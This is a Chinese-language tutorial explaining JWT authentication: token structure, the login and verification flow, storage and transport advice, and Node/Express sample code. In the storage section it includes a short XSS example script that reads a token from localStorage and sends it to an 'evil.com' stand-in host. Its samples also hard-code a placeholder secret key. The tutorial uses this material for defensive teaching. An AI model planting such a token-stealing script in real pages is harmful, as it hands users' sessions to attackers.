---
title: JWT 身份认证
icon: mdi:web
---

# JWT 身份认证

## 1. JWT 的核心结构

JWT（JSON Web Token）由三部分组成，用 `.` 连接：`Header.Payload.Signature`

### 1.1 Header（头部）

**作用：** 声明令牌类型（`typ: "JWT"`）和使用的签名算法（如 HS256 哈希算法、RS256 非对称算法）。

**示例（JSON 格式）：**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**处理：** 转为字符串后用 **Base64 编码**，成为 JWT 的第一部分。

```javascript
// Base64 编码后
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

### 1.2 Payload（载荷）

**作用：** 存储需要传递的非敏感数据（如用户 ID、用户名、过期时间），包含 **标准声明** 和 **自定义声明**。

**标准声明（可选）：**
- `exp`：过期时间（时间戳）
- `iss`：签发者（Issuer）
- `sub`：主题（Subject）
- `aud`：受众（Audience）
- `iat`：签发时间（Issued At）

**自定义声明：** 根据业务需求添加

**示例（JSON 格式）：**

```json
{
  "exp": 1728000000,
  "userId": 123,
  "username": "张三",
  "role": "admin"
}
```

**处理：** 转为字符串后用 **Base64 编码**，成为 JWT 的第二部分。

```javascript
// Base64 编码后
eyJ1c2VySWQiOjEyMywiZXhwIjoxNzI4MDAwMDAwfQ
```

### 1.3 Signature（签名）

**作用：** 防止令牌被篡改，是 JWT 安全性的核心。

**生成规则（以 HS256 算法为例）：**

1. 拼接编码后的 Header 和 Payload：`HeaderBase64.PayloadBase64`
2. 用服务器端保存的密钥（Secret）对拼接后的字符串进行哈希计算

**公式：**

```plaintext
Signature = HS256(HeaderBase64 + "." + PayloadBase64, 服务器密钥)
```

**处理：** 直接作为 JWT 的第三部分

**最终完整 JWT：**

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiZXhwIjoxNzI4MDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

## 2. JWT 的工作流程（以"用户登录"为例）

### 2.1 流程图

```
1. 用户登录
   ↓
2. 服务器验证并生成 JWT
   ↓
3. 前端存储 JWT
   ↓
4. 后续请求携带 JWT
   ↓
5. 服务器验证 JWT
   ↓
6. 返回受保护资源
```

### 2.2 详细步骤

#### 步骤 1：用户登录

```javascript
// 前端发送登录请求
fetch('/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'zhangsan',
    password: '123456'
  })
});
```

#### 步骤 2：服务器验证并生成 JWT

```javascript
// 服务器端（Node.js 示例）
const jwt = require('jsonwebtoken');

// 验证账号密码
if (username === 'zhangsan' && password === '123456') {
  // 生成 JWT
  const token = jwt.sign(
    { userId: 123, username: 'zhangsan' }, // Payload
    'your-secret-key',                      // 密钥
    { expiresIn: '1h' }                    // 1小时后过期
  );
  
  // 返回给前端
  res.json({ token });
}
```

#### 步骤 3：前端存储 JWT

```javascript
// 方式 1：localStorage（不推荐，易受 XSS 攻击）
localStorage.setItem('token', token);

// 方式 2：HTTP-only Cookie（推荐）
// 服务器设置 Cookie
res.cookie('token', token, {
  httpOnly: true,      // 禁止 JavaScript 访问
  secure: true,        // 仅 HTTPS 传输
  sameSite: 'strict'   // 防止 CSRF 攻击
});
```

#### 步骤 4：后续请求携带 JWT

```javascript
// 从 localStorage 读取并携带
fetch('/api/user/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});

// 使用 HTTP-only Cookie 时，浏览器会自动携带
fetch('/api/user/profile', {
  credentials: 'include'  // 携带 Cookie
});
```

#### 步骤 5：服务器验证 JWT

```javascript
// 服务器端验证
const token = req.headers.authorization?.split(' ')[1]; // 提取 Token

try {
  // 验证签名和过期时间
  const decoded = jwt.verify(token, 'your-secret-key');
  
  // 验证通过，获取用户信息
  console.log(decoded); // { userId: 123, username: 'zhangsan', exp: 1728000000 }
  
  // 执行业务逻辑
  const userProfile = getUserProfile(decoded.userId);
  res.json(userProfile);
  
} catch (error) {
  // 验证失败（签名错误或已过期）
  res.status(401).json({ message: '令牌无效或已过期' });
}
```

## 3. JWT 的优缺点

### 3.1 优点

#### ✅ 无状态

- 服务器不需要存储令牌（传统 Session 需要存服务器）
- 减轻服务器压力，节省内存和数据库开销
- 适合分布式系统（多台服务器可共用密钥验证）

#### ✅ 轻量

- 令牌体积小（通常几百字节）
- 传递速度快，不占用过多带宽

#### ✅ 跨语言/跨域

- 基于 JSON 格式，任何支持 JSON 的语言都能解析
- 适合前后端分离、跨域场景
- 不依赖特定技术栈

### 3.2 缺点

#### ❌ 无法主动吊销

- JWT 一旦生成，在 `exp` 过期前始终有效
- 若用户注销登录或令牌泄露，服务器无法主动作废
- **解决方案：** 可搭配 "令牌黑名单" 存储已注销的令牌，但会失去 "无状态" 优势

```javascript
// 黑名单示例
const blacklist = new Set();

// 用户注销时加入黑名单
app.post('/logout', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  blacklist.add(token);
  res.json({ message: '注销成功' });
});

// 验证时检查黑名单
if (blacklist.has(token)) {
  return res.status(401).json({ message: '令牌已失效' });
}
```

#### ❌ Payload 不加密

- Base64 编码可轻松解码（不是加密）
- **不能存储敏感数据**（如密码、手机号、身份证号）
- 只能存储非敏感的用户标识信息

```javascript
// 错误示例 ❌
const token = jwt.sign({
  userId: 123,
  password: '123456',     // 危险！
  phoneNumber: '13800138000'  // 危险！
}, secret);

// 正确示例 ✅
const token = jwt.sign({
  userId: 123,
  username: 'zhangsan',
  role: 'admin'
}, secret);
```

#### ❌ 密钥安全至关重要

- 若服务器密钥泄露，攻击者可伪造任意 JWT
- 必须妥善保管密钥
- **建议：** 使用非对称算法 RS256（私钥签名、公钥验证），降低密钥泄露风险

```javascript
// 对称加密（HS256）- 密钥需保密
const token = jwt.sign(payload, 'secret-key', { algorithm: 'HS256' });

// 非对称加密（RS256）- 更安全
const privateKey = fs.readFileSync('private.key');
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });

// 验证时使用公钥
const publicKey = fs.readFileSync('public.key');
jwt.verify(token, publicKey);
```

## 4. 前端使用 JWT 的注意事项

### 4.1 存储方式选择

#### ❌ 避免用 localStorage

- 易受 XSS 攻击（攻击者可通过脚本窃取令牌）
- 任何 JavaScript 代码都能访问

```javascript
// 危险示例
localStorage.setItem('token', token);

// XSS 攻击示例
<script>
  // 恶意脚本可以轻易获取
  const token = localStorage.getItem('token');
  fetch('https://evil.com/steal?token=' + token);
</script>
```

#### ✅ 推荐用 HTTP-only Cookie

- 浏览器禁止 JavaScript 访问
- 可防 XSS 攻击
- 配合 `SameSite=Strict` 可防 CSRF 攻击

```javascript
// 服务器端设置
res.cookie('token', token, {
  httpOnly: true,       // 防止 XSS
  secure: true,         // 仅 HTTPS
  sameSite: 'strict',   // 防止 CSRF
  maxAge: 3600000       // 1小时过期
});
```

### 4.2 过期处理

#### 监听 401 状态码

```javascript
// Axios 拦截器示例
axios.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      // 令牌过期，跳转登录页
      localStorage.removeItem('token');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);
```

#### 使用刷新令牌（Refresh Token）

```javascript
// 登录时返回两个令牌
{
  "accessToken": "短期令牌（15分钟）",
  "refreshToken": "长期令牌（7天）"
}

// accessToken 快过期时，用 refreshToken 换取新令牌
async function refreshAccessToken() {
  const response = await fetch('/api/refresh', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${refreshToken}`
    }
  });
  const { accessToken } = await response.json();
  localStorage.setItem('token', accessToken);
}
```

### 4.3 传输安全

#### 必须使用 HTTPS

```javascript
// ❌ HTTP 传输（危险）
fetch('http://example.com/api/user', {
  headers: { 'Authorization': `Bearer ${token}` }
});

// ✅ HTTPS 传输（安全）
fetch('https://example.com/api/user', {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

- HTTP 传输易被中间人拦截
- HTTPS 加密传输，保护令牌安全
- 生产环境必须配置 SSL 证书

## 5. 完整示例代码

### 5.1 前端完整流程

```javascript
// 登录
async function login(username, password) {
  const response = await fetch('https://api.example.com/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  
  const { token } = await response.json();
  
  // 存储到 localStorage（实际项目推荐用 HTTP-only Cookie）
  localStorage.setItem('token', token);
}

// 发送认证请求
async function getUserProfile() {
  const token = localStorage.getItem('token');
  
  const response = await fetch('https://api.example.com/user/profile', {
    headers: {
      'Authorization': `Bearer ${token}`
    }
  });
  
  if (response.status === 401) {
    // 令牌过期，重新登录
    alert('登录已过期，请重新登录');
    window.location.href = '/login';
    return;
  }
  
  const data = await response.json();
  return data;
}

// 注销
function logout() {
  localStorage.removeItem('token');
  window.location.href = '/login';
}
```

### 5.2 服务器端完整流程（Node.js + Express）

```javascript
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

const SECRET_KEY = 'your-secret-key'; // 实际项目应使用环境变量

// 登录接口
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // 验证用户（实际应查询数据库）
  if (username === 'zhangsan' && password === '123456') {
    // 生成 JWT
    const token = jwt.sign(
      { userId: 123, username },
      SECRET_KEY,
      { expiresIn: '1h' }
    );
    
    res.json({ token });
  } else {
    res.status(401).json({ message: '账号或密码错误' });
  }
});

// 认证中间件
function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ message: '缺少令牌' });
  }
  
  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    req.user = decoded; // 将用户信息附加到请求对象
    next();
  } catch (error) {
    res.status(401).json({ message: '令牌无效或已过期' });
  }
}

// 受保护的接口
app.get('/user/profile', authenticateToken, (req, res) => {
  // 从令牌中获取用户信息
  const { userId, username } = req.user;
  
  // 返回用户数据（实际应查询数据库）
  res.json({
    userId,
    username,
    email: 'zhangsan@example.com'
  });
});

app.listen(3000);
```

## 6. 常见问题

### Q1：JWT 和 Session 有什么区别？

| 特性 | JWT | Session |
|------|-----|---------|
| 存储位置 | 客户端（前端） | 服务器端 |
| 服务器压力 | 低（无状态） | 高（需存储） |
| 扩展性 | 好（适合分布式） | 差（需共享 Session） |
| 安全性 | 依赖密钥 | 依赖服务器 |
| 吊销能力 | 难（需黑名单） | 易（直接删除） |

### Q2：JWT 可以用于移动端吗？

✅ 可以，JWT 非常适合移动端：
- 移动端可将令牌存储在安全存储（如 iOS Keychain、Android KeyStore）
- 不依赖 Cookie，避免跨域问题
- 轻量级，减少网络传输

### Q3：JWT 过期了怎么办？

方案 1：重新登录
方案 2：使用刷新令牌（Refresh Token）自动续期
方案 3：设置较长过期时间（如 7 天），牺牲安全性换取便利性

---

> 💡 **核心要点：** JWT 是无状态的身份认证方案，适合前后端分离和分布式系统，但需要注意存储安全和传输安全。
